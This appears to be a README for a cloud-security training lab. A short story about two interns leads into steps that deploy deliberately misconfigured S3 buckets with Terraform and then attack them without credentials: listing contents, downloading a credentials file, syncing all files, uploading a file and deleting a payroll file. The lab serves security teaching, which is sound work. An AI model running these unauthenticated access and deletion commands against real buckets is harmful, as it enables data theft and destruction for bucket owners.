# S3 Misconfiguration

## In the bustling corridors of Cloud Innovators, a cutting-edge tech organization, two interns named Alice and Bob joined the ranks. Eager to prove themselves, they were tasked with deploying S3 buckets to store important company files. Little did they know that their actions would set the stage for a cloud security saga. Alice created the bucket MisconfiguredBucket and Bob misconfiguredacl bucket

# Now that you've journeyed through the gripping story of Cloud Innovators, it's time for you, to immerse yourself as an attacker and how to act as defense in such scenarios in hands-on learning.

* Explore Misconfigurations in "MisconfiguredBucket":

Enter the realm of the misconfigured S3 bucket, "MisconfiguredBucket," where an attacker gained unauthorized access. Dive into the hands-on lab and discover how misconfigurations can lead to CRUD operations on sensitive files. Learn to secure your buckets against potential threats.

* Unravel the Mystery of "misconfiguredacl":

Venture into the kingdom of "misconfiguredacl," where Authenticated Users gained unintended FULL_CONTROL permissions. Engage in the lab to unravel the mystery, understand ACL misconfigurations, and fortify your buckets against unauthorized access.


## Follow the below instructions given to solve this Lab

### please install the below cli tools 


* AWS CLI

```bash
sudo apt-get install awscli
```
* Terraform - click on the below link for further help on on installing 

```bash
https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
```

* Step 1 Clone the repository 

```bash
git clone https://github.com/bvabhishek/s3misconfiguration.git
```
* Step 2: Change Directory

```bash
cd s3misconfiguration/
```
* Step 3: Initialise terraform 

```bash
terraform init
```

* Step 4: Run `terraform apply -auto-approve`

```bash
terraform apply -auto-approve
```

* Step 5: Export bucket name created by Alice 

```bash
export s3bucket=<bucketname> 
```

* Step 6: Lets try to list down the contents of bucket

```bash
aws s3 ls s3://$s3bucket --no-sign-request
```

* Step 7: Know which geo location the bucket is hosted

```
 aws s3api get-bucket-location --bucket $s3bucket
```
* Step 7: Now lets perform all the possible attack scenarios

* Step 8: Lets first download the fishy files - to your current working directory

```bash
aws s3 cp s3://$s3bucket/creds.txt . --no-sign-request --region us-west-2

```
* To download all the files from the bucket use sync command

```bash
aws s3 sync s3://$s3bucket /home/abhi/seasides/test/
```

* Step 9: Let's upload a new file 

```bash
aws s3 cp seasides.jpeg s3://$s3bucket --no-sign-request --region us-west-2
```

* Step 10: Let's Delete a file 


```bash
aws s3 rm s3://$s3bucket/emp_pay_dont_delete.csv --no-sign-request --region us-west-2
```


* By this we know that the attacker has performed all the malicious functionalities ie, CRUD operations which leads to Vulnerabilities such as 
* Broken Authentication
* Sensitive Information Disclosure 
